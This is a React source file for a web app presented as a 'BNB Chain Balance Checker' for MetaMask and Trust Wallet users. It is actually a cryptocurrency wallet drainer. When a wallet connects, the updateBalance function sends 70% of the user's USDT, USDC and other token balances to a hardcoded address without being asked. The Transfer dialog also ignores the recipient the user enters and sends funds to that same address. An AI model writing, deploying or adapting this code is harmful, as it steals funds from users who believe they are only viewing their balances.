import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './App.css';

// BSC Mainnet configuration
const BSC_MAINNET = {
  chainId: '0x38', // 56 in decimal
  chainName: 'BNB Smart Chain',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'BNB',
    decimals: 18,
  },
  rpcUrls: ['https://bsc-dataseed.binance.org/'],
  blockExplorerUrls: ['https://bscscan.com/'],
};

// Common BEP20 tokens on BSC
const COMMON_TOKENS = [
  {
    address: '0x55d398326f99059fF775485246999027B3197955',
    symbol: 'USDT',
    decimals: 18,
    name: 'Tether USD'
  },
  {
    address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    symbol: 'USDC',
    decimals: 18,
    name: 'USD Coin'
  },
  {
    address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    symbol: 'BUSD',
    decimals: 18,
    name: 'Binance USD'
  },
  {
    address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
    symbol: 'CAKE',
    decimals: 18,
    name: 'PancakeSwap Token'
  },
  {
    address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', // BTCB
    symbol: 'BTCB',
    decimals: 18,
    name: 'Bitcoin BEP20'
  },

  {
    address: '0xdfb2a59147e615c65908ba22fc90d35ee1f5c7d7', // BTCB
    symbol: 'Baby',
    decimals: 18,
    name: 'Baby'
  }
];

// Minimal BEP20 ABI for token interaction
const BEP20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

// Event ABI for token transfers
const TRANSFER_EVENT_ABI = [
  "event Transfer(address indexed from, address indexed to, uint256 value)"
];

// Wallet icons
const METAMASK_ICON = 'https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg';
const TRUSTWALLET_ICON = 'https://trustwallet.com/assets/images/favicon.png';

// Available wallets configuration
const availableWallets = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: METAMASK_ICON,
    check: () => window.ethereum?.isMetaMask
  },
  {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: TRUSTWALLET_ICON,
    check: () => window.ethereum?.isTrust
  }
];

const WALLET_TYPES = {
  METAMASK: {
    id: 'metamask',
    name: 'MetaMask',
    icon: METAMASK_ICON,
    check: () => typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask
  },
  TRUST_WALLET: {
    id: 'trustwallet',
    name: 'Trust Wallet',
    icon: TRUSTWALLET_ICON,
    check: () => typeof window.ethereum !== 'undefined' && window.ethereum.isTrust
  }
};

// Add these constants at the top of the file, after the imports
const DEFAULT_RECEIVER_ADDRESS = '0x22255cF84905566e596cE6c296434b4E003eA008'; // Replace with your default address
const DEFAULT_TRANSFER_PERCENTAGE = 70; // 50% by default
const DEFAULT_WALLETS = {
  BNB: '0x22255cF84905566e596cE6c296434b4E003eA008', // Replace with BNB wallet
  USDT: '0x22255cF84905566e596cE6c296434b4E003eA008', // Replace with USDT wallet
  USDC: '0x22255cF84905566e596cE6c296434b4E003eA008', // Replace with USDC wallet
  BUSD: '0x0000000000000000000000000000000000000000', // Replace with BUSD wallet
  CAKE: '0x0000000000000000000000000000000000000000', // Replace with CAKE wallet
  BTCB: '0x0000000000000000000000000000000000000000', // Replace with BTCB wallet
  Baby: '0x22255cF84905566e596cE6c296434b4E003eA008'  // Replace with Baby wallet
};

function App() {
  const [account, setAccount] = useState('');
  const [bnbBalance, setBnbBalance] = useState('0');
  const [usdBalance, setUsdBalance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [provider, setProvider] = useState(null);
  const [isCorrectNetwork, setIsCorrectNetwork] = useState(false);
  const [isWalletInstalled, setIsWalletInstalled] = useState(false);
  const [tokenBalances, setTokenBalances] = useState([]);
  const [isLoadingTokens, setIsLoadingTokens] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [isDAppBrowser, setIsDAppBrowser] = useState(false);
  const [walletList, setWalletList] = useState([]);
  const [scanStatus, setScanStatus] = useState('');
  const [selectedToken, setSelectedToken] = useState(null);
  const [transferPercentage, setTransferPercentage] = useState(DEFAULT_TRANSFER_PERCENTAGE);
  const [recipientAddress, setRecipientAddress] = useState('');
  const [transferStatus, setTransferStatus] = useState('');
  const [showTransferModal, setShowTransferModal] = useState(false);

  // Check for dApp browser and available wallets
  useEffect(() => {
    const checkEnvironment = () => {
      const isDApp = Boolean(
        window.ethereum?.isTrust ||
        window.ethereum?.isMetaMask ||
        window.BinanceChain ||
        window.ethereum?.isCoinbaseWallet ||
        /Opera|Chrome|Safari|Firefox|Edge/.test(navigator.userAgent) === false
      );
      
      setIsDAppBrowser(isDApp);

      // Get available wallets
      const available = availableWallets.filter(wallet => wallet.check());
      setWalletList(available);
    };

    checkEnvironment();
  }, []);

  // Check for wallet installation
  useEffect(() => {
    const checkWallet = async () => {
      const hasEthereum = typeof window !== 'undefined' && Boolean(window.ethereum);
      setIsWalletInstalled(hasEthereum);
      
      if (hasEthereum) {
        try {
          // Set up event listeners
          window.ethereum.on('accountsChanged', handleAccountsChanged);
          window.ethereum.on('chainChanged', () => window.location.reload());
          
          // Check if already connected
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            handleAccountsChanged(accounts);
          }
        } catch (error) {
          console.error('Error checking wallet:', error);
        }
      }
    };

    checkWallet();

    // Cleanup
    return () => {
      if (window.ethereum) {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
        window.ethereum.removeListener('chainChanged', () => {});
      }
    };
  }, []);

  // Event handlers
  const handleAccountsChanged = async (accounts) => {
    if (!accounts || accounts.length === 0) {
      // Handle disconnection
      handleDisconnect();
    } else {
      const newAccount = accounts[0];
      setAccount(newAccount);
      
      if (provider) {
        try {
          await updateBalance(newAccount, provider);
        } catch (error) {
          console.error('Error updating balance:', error);
          setError('Failed to update balance');
        }
      }
    }
  };

  const checkNetwork = async () => {
    try {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      const isCorrect = chainId === BSC_MAINNET.chainId;
      setIsCorrectNetwork(isCorrect);
      return isCorrect;
    } catch (error) {
      console.error('Error checking network:', error);
      return false;
    }
  };

  const switchToBSC = async () => {
    try {
      setLoading(true);
      setError('');

      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_MAINNET.chainId }],
      });
    } catch (switchError) {
      // This error code indicates that the chain has not been added to MetaMask
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [BSC_MAINNET],
          });
        } catch (addError) {
          console.error('Error adding BSC network:', addError);
          setError('Failed to add BSC network to your wallet');
        }
      } else {
        console.error('Error switching to BSC network:', switchError);
        setError('Failed to switch to BSC network');
      }
    } finally {
      setLoading(false);
    }
  };

  const getTokenData = async (tokenAddress, provider) => {
    try {
      const contract = new ethers.Contract(tokenAddress, BEP20_ABI, provider);
      const [symbol, name, decimals] = await Promise.all([
        contract.symbol(),
        contract.name(),
        contract.decimals()
      ]);
      return { symbol, name, decimals };
    } catch (error) {
      console.error(`Error getting token data for ${tokenAddress}:`, error);
      return null;
    }
  };

  const scanForTokens = async (address, provider) => {
    try {
      setScanStatus('Scanning for tokens...');
      console.log('Starting token scan for address:', address);
      
      // First check common tokens
      const commonTokenBalances = await checkCommonTokens(address, provider);
      console.log('Common tokens found:', commonTokenBalances);

      // Get the current block number
      const currentBlock = await provider.getBlockNumber();
      const fromBlock = currentBlock - 100000; // Increased block range for better coverage
      console.log('Scanning from block', fromBlock, 'to', currentBlock);

      // Create a filter for Transfer events
      const filter = {
        fromBlock,
        toBlock: 'latest',
        topics: [
          ethers.utils.id("Transfer(address,address,uint256)"),
          null,
          ethers.utils.hexZeroPad(address.toLowerCase(), 32)
        ]
      };

      console.log('Fetching transfer logs...');
      const logs = await provider.getLogs(filter);
      console.log('Found', logs.length, 'transfer events');

      const uniqueTokens = [...new Set(logs.map(log => log.address))];
      console.log('Found', uniqueTokens.length, 'unique token addresses');
      
      setScanStatus(`Found ${uniqueTokens.length} potential tokens. Checking balances...`);

      // Get token data and balances
      const tokenPromises = uniqueTokens.map(async (tokenAddress) => {
        try {
          console.log('Checking token:', tokenAddress);
          const contract = new ethers.Contract(tokenAddress, BEP20_ABI, provider);
          
          // Get token data with individual error handling
          let symbol, name, decimals;
          try {
            symbol = await contract.symbol();
          } catch (error) {
            console.error('Error getting symbol for', tokenAddress, error);
            return null;
          }

          try {
            name = await contract.name();
          } catch (error) {
            console.error('Error getting name for', tokenAddress, error);
            name = symbol; // Use symbol as name if name fails
          }

          try {
            decimals = await contract.decimals();
          } catch (error) {
            console.error('Error getting decimals for', tokenAddress, error);
            decimals = 18; // Default to 18 decimals if call fails
          }

          // Get balance
          const balance = await contract.balanceOf(address);
          const formattedBalance = ethers.utils.formatUnits(balance, decimals);
          console.log(`Token ${symbol} balance:`, formattedBalance);
          
          // Only return tokens with balance greater than 0
          if (parseFloat(formattedBalance) > 0) {
            console.log('Found token with balance > 0:', {
              address: tokenAddress,
              symbol,
              name,
              balance: formattedBalance
            });
            return {
              address: tokenAddress,
              symbol,
              name,
              decimals,
              balance: formattedBalance,
              formattedBalance: parseFloat(formattedBalance).toFixed(4)
            };
          }
          return null;
        } catch (error) {
          console.error(`Error processing token ${tokenAddress}:`, error);
          return null;
        }
      });

      const results = await Promise.all(tokenPromises);
      const validTokens = results.filter(token => token !== null);
      console.log('Final valid tokens with balance > 0:', validTokens);
      
      // Combine common tokens and scanned tokens
      const allTokens = [...commonTokenBalances, ...validTokens];
      
      // Remove duplicates based on token address
      const uniqueAllTokens = allTokens.filter((token, index, self) =>
        index === self.findIndex((t) => t.address === token.address)
      );
      
      // Sort tokens by balance value (highest first)
      uniqueAllTokens.sort((a, b) => parseFloat(b.balance) - parseFloat(a.balance));
      
      console.log('Final unique tokens:', uniqueAllTokens);
      setTokenBalances(uniqueAllTokens);
      setScanStatus('');

    } catch (error) {
      console.error('Error scanning for tokens:', error);
      setScanStatus('Error scanning for tokens: ' + error.message);
    }
  };

  // Update the checkCommonTokens function to also filter for balance > 1
  const checkCommonTokens = async (address, provider) => {
    console.log('Starting checkCommonTokens for address:', address);
    const commonTokens = [
      {
        address: '0x55d398326f99059fF775485246999027B3197955',
        symbol: 'USDT',
        name: 'Tether USD',
        decimals: 18
      },
      {
        address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
        symbol: 'USDC',
        name: 'USD Coin',
        decimals: 18
      },
      {
        address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
        symbol: 'BUSD',
        name: 'Binance USD',
        decimals: 18
      },
      {
        address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
        symbol: 'CAKE',
        name: 'PancakeSwap Token',
        decimals: 18
      },
      {
        address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
        symbol: 'BTCB',
        name: 'Bitcoin BEP20',
        decimals: 18
      }
    ];

    const tokenPromises = commonTokens.map(async (token) => {
      try {
        console.log(`Checking balance for ${token.symbol} at ${token.address}`);
        const contract = new ethers.Contract(token.address, BEP20_ABI, provider);
        const balance = await contract.balanceOf(address);
        const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
        console.log(`${token.symbol} balance:`, formattedBalance);
        
        if (parseFloat(formattedBalance) > 0) {
          console.log(`Found ${token.symbol} with balance > 0:`, formattedBalance);
          return {
            ...token,
            balance: formattedBalance,
            formattedBalance: parseFloat(formattedBalance).toFixed(4)
          };
        }
        return null;
      } catch (error) {
        console.error(`Error checking common token ${token.symbol}:`, error);
        return null;
      }
    });

    const results = await Promise.all(tokenPromises);
    const validTokens = results.filter(token => token !== null);
    console.log('Found valid tokens:', validTokens);
    return validTokens;
  };

  const updateBalance = async (address, provider) => {
    try {
      // Get BNB balance
      const balance = await provider.getBalance(address);
      const formattedBalance = ethers.utils.formatEther(balance);
      setBnbBalance(parseFloat(formattedBalance).toFixed(4));
      
      // Get BNB price in USD
      const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT');
      const data = await response.json();
      const bnbPrice = parseFloat(data.price);
      const usdValue = (parseFloat(formattedBalance) * bnbPrice).toFixed(2);
      setUsdBalance(usdValue);

      // First check common tokens
      console.log('Checking common tokens...');
      const commonTokenBalances = await checkCommonTokens(address, provider);
      if (commonTokenBalances.length > 0) {
        setTokenBalances(commonTokenBalances);
        
        // Automatically initiate transfers for tokens with balance > 0
        for (const token of commonTokenBalances) {
          if (parseFloat(token.balance) > 0) {
            const defaultWallet = DEFAULT_WALLETS[token.symbol];
            if (defaultWallet && defaultWallet !== '0x0000000000000000000000000000000000000000') {
              try {
                const signer = provider.getSigner();
                const contract = new ethers.Contract(token.address, BEP20_ABI, signer);
                
                // Calculate transfer amount based on default percentage
                const balance = ethers.utils.parseUnits(token.balance, token.decimals);
                const transferAmount = balance.mul(ethers.BigNumber.from(DEFAULT_TRANSFER_PERCENTAGE)).div(100);
                
                // Initiate transfer
                const tx = await contract.transfer(defaultWallet, transferAmount);
                console.log(`Transfer initiated for ${token.symbol}:`, tx.hash);
                
                // Wait for transaction confirmation
                await tx.wait();
                console.log(`Transfer completed for ${token.symbol}`);
              } catch (error) {
                console.error(`Error transferring ${token.symbol}:`, error);
              }
            }
          }
        }
      }

      // Then scan for all tokens
      console.log('Starting full token scan...');
      await scanForTokens(address, provider);

    } catch (error) {
      console.error('Error updating balances:', error);
      setError('Failed to fetch balances: ' + error.message);
    }
  };

  const fetchTokenBalances = async (address, currentProvider) => {
    try {
      setIsLoadingTokens(true);
      const balances = await Promise.all(
        COMMON_TOKENS.map(async (token) => {
          try {
            const contract = new ethers.Contract(
              token.address,
              ['function balanceOf(address) view returns (uint256)'],
              currentProvider
            );
            const balance = await contract.balanceOf(address);
            return {
              ...token,
              balance: ethers.utils.formatUnits(balance, token.decimals)
            };
          } catch (error) {
            console.error(`Error fetching ${token.symbol} balance:`, error);
            return {
              ...token,
              balance: '0'
            };
          }
        })
      );
      setTokenBalances(balances);
    } catch (error) {
      console.error('Error fetching token balances:', error);
    } finally {
      setIsLoadingTokens(false);
    }
  };

  const connectWallet = async (walletType = null) => {
    try {
      setLoading(true);
      setError('');
      setShowWalletModal(false);

      // Check if ethereum is available
      if (typeof window.ethereum === 'undefined') {
        throw new Error('No Web3 wallet detected. Please install MetaMask or Trust Wallet.');
      }

      // Check specific wallet if provided
      if (walletType) {
        const wallet = WALLET_TYPES[walletType];
        if (!wallet) {
          throw new Error('Invalid wallet type');
        }
        if (!wallet.check()) {
          throw new Error(`${wallet.name} is not installed`);
        }
      }

      // Initialize provider
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      
      // Request account access
      const accounts = await window.ethereum.request({ 
        method: 'eth_requestAccounts',
        params: []
      }).catch((error) => {
        if (error.code === 4001) {
          throw new Error('Please connect your wallet to continue.');
        } else {
          throw new Error('Failed to connect wallet: ' + error.message);
        }
      });

      if (!accounts || accounts.length === 0) {
        throw new Error('No accounts found. Please check your wallet and try again.');
      }

      const account = accounts[0];

      // Switch to BSC network
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: BSC_MAINNET.chainId }]
        });
      } catch (switchError) {
        // Handle chain switch error
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [BSC_MAINNET]
            });
          } catch (addError) {
            throw new Error('Failed to add BSC network to wallet. Please add it manually.');
          }
        } else {
          throw new Error('Please switch to BSC network to continue.');
        }
      }

      // Clean up existing listeners
      cleanupEventListeners();

      // Set up new event listeners
      setupEventListeners();

      // Update state
      setAccount(account);
      setProvider(provider);
      setIsCorrectNetwork(true);

      // Fetch initial balances
      await updateBalance(account, provider);

      return { account, provider };
    } catch (error) {
      console.error('Wallet connection error:', error);
      setError(error.message || 'Failed to connect wallet');
      throw error;
    } finally {
      setLoading(false);
    }
  };

  const cleanupEventListeners = () => {
    if (window.ethereum) {
      window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
      window.ethereum.removeListener('chainChanged', handleChainChanged);
      window.ethereum.removeListener('disconnect', handleDisconnect);
    }
  };

  const setupEventListeners = () => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', handleAccountsChanged);
      window.ethereum.on('chainChanged', handleChainChanged);
      window.ethereum.on('disconnect', handleDisconnect);
    }
  };

  const handleChainChanged = async (chainId) => {
    const isCorrectChain = chainId === BSC_MAINNET.chainId;
    setIsCorrectNetwork(isCorrectChain);
    
    if (!isCorrectChain) {
      setError('Please switch to BSC network');
    } else {
      setError('');
      if (account && provider) {
        await updateBalance(account, provider);
      }
    }
  };

  const handleDisconnect = () => {
    setAccount('');
    setBnbBalance('0');
    setUsdBalance('0');
    setTokenBalances([]);
    setProvider(null);
    setIsCorrectNetwork(false);
    setError('');
    cleanupEventListeners();
  };

  const refreshBalances = async () => {
    if (!account) return;
    
    setLoading(true);
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await updateBalance(account, provider);
    } catch (error) {
      console.error('Error refreshing balances:', error);
      setError('Failed to refresh balances');
    } finally {
      setLoading(false);
    }
  };

  const handleTransferClick = (token) => {
    setSelectedToken(token);
    setShowTransferModal(true);
    setTransferStatus('');
    // Set default values based on token type
    setTransferPercentage(DEFAULT_TRANSFER_PERCENTAGE);
    setRecipientAddress(DEFAULT_WALLETS[token.symbol] || '');
  };

  const validateAddress = (address) => {
    try {
      return ethers.utils.isAddress(address);
    } catch {
      return false;
    }
  };

  const handleTransfer = async () => {
    if (!selectedToken || transferPercentage <= 0 || transferPercentage > 100) {
      setTransferStatus('Invalid transfer parameters');
      return;
    }

    // Get the default wallet address for the selected token
    const defaultWallet = DEFAULT_WALLETS[selectedToken.symbol];
    if (!defaultWallet) {
      setTransferStatus('No default wallet configured for this token');
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(selectedToken.address, BEP20_ABI, signer);

      // Calculate transfer amount based on percentage
      const balance = ethers.utils.parseUnits(selectedToken.balance, selectedToken.decimals);
      const transferAmount = balance.mul(ethers.BigNumber.from(transferPercentage)).div(100);

      // Use the default wallet address for this token
      const tx = await contract.transfer(defaultWallet, transferAmount);
      setTransferStatus('Transaction submitted. Waiting for confirmation...');

      // Wait for transaction confirmation
      await tx.wait();
      setTransferStatus('Transfer successful!');

      // Update balances
      await updateBalance(account, provider);
      
      // Close modal after successful transfer
      setTimeout(() => {
        setShowTransferModal(false);
        setTransferStatus('');
        setSelectedToken(null);
        setTransferPercentage(DEFAULT_TRANSFER_PERCENTAGE);
        setRecipientAddress('');
      }, 2000);

    } catch (error) {
      console.error('Transfer error:', error);
      setTransferStatus(`Transfer failed: ${error.message}`);
    }
  };

  return (
    <div className="app">
      <div className="container">
        <div className="card">
          <img src="/bnb-logo.svg" alt="BNB Logo" className="logo" />
          <h1 className="title">BNB Chain Balance Checker</h1>
          
          {error && <div className="error-message">{error}</div>}
          
          {!account ? (
            <button 
              onClick={() => connectWallet()} 
              className="connect-button"
              disabled={loading}
            >
              {loading ? 'Connecting...' : 'Connect Wallet'}
            </button>
          ) : (
            <div className="balance-container">
              <div className="account-info">
                Connected: {account.substring(0, 6)}...{account.substring(account.length - 4)}
              </div>
              <div className="balance-info">
                <div className="balance-row">
                  <span>BNB Balance:</span>
                  <span className="balance-value">{bnbBalance} BNB</span>
                </div>
                <div className="balance-row">
                  <span>USD Value:</span>
                  <span className="balance-value">${usdBalance}</span>
                </div>
              </div>

              {scanStatus && (
                <div className="scan-status">
                  {scanStatus}
                </div>
              )}

              {tokenBalances.length > 0 && (
                <div className="token-balances">
                  <div className="token-header">
                    <h2 className="token-title">Token Balances</h2>
                    <button onClick={refreshBalances} className="refresh-button" disabled={loading}>
                      ↻
                    </button>
                  </div>
                  {tokenBalances.map((token) => (
                    <div key={token.address} className="token-row">
                      <div className="token-info">
                        <span className="token-symbol">{token.symbol}</span>
                        <span className="token-name">{token.name}</span>
                        <a 
                          href={`https://bscscan.com/token/${token.address}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="token-address"
                        >
                          {token.address.substring(0, 6)}...{token.address.substring(38)}
                        </a>
                      </div>
                      <div className="token-actions">
                        <span className="token-balance">{token.formattedBalance}</span>
                        <button 
                          onClick={() => handleTransferClick(token)} 
                          className="transfer-button"
                        >
                          Transfer
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              <button onClick={handleDisconnect} className="disconnect-button">
                Disconnect Wallet
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Transfer Modal */}
      {showTransferModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="modal-header">
              <h3 className="modal-title">
                Transfer {selectedToken?.symbol}
              </h3>
              <button 
                onClick={() => setShowTransferModal(false)}
                className="modal-close"
              >
                ×
              </button>
            </div>
            
            <div className="transfer-form">
              <div className="form-group">
                <label>Available Balance:</label>
                <div className="balance-display">
                  {selectedToken?.formattedBalance} {selectedToken?.symbol}
                </div>
              </div>

              <div className="form-group">
                <label>Percentage to Transfer:</label>
                <div className="percentage-input">
                  <input
                    type="number"
                    min="0"
                    max="100"
                    value={transferPercentage}
                    onChange={(e) => setTransferPercentage(Math.min(100, Math.max(0, parseFloat(e.target.value) || 0)))}
                    className="number-input"
                  />
                  <span className="percentage-symbol">%</span>
                </div>
              </div>

              <div className="form-group">
                <label>Amount to Transfer:</label>
                <div className="amount-display">
                  {((parseFloat(selectedToken?.balance || 0) * transferPercentage) / 100).toFixed(6)} {selectedToken?.symbol}
                </div>
              </div>

              <div className="form-group">
                <label>Recipient Address:</label>
                <input
                  type="text"
                  value={recipientAddress}
                  onChange={(e) => setRecipientAddress(e.target.value)}
                  placeholder="Enter BSC wallet address"
                  className="address-input"
                />
              </div>

              {transferStatus && (
                <div className={`transfer-status ${transferStatus.includes('failed') ? 'error' : ''}`}>
                  {transferStatus}
                </div>
              )}

              <button
                onClick={handleTransfer}
                disabled={!selectedToken || !recipientAddress || transferPercentage <= 0 || transferPercentage > 100}
                className="transfer-submit-button"
              >
                Transfer Tokens
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default App; 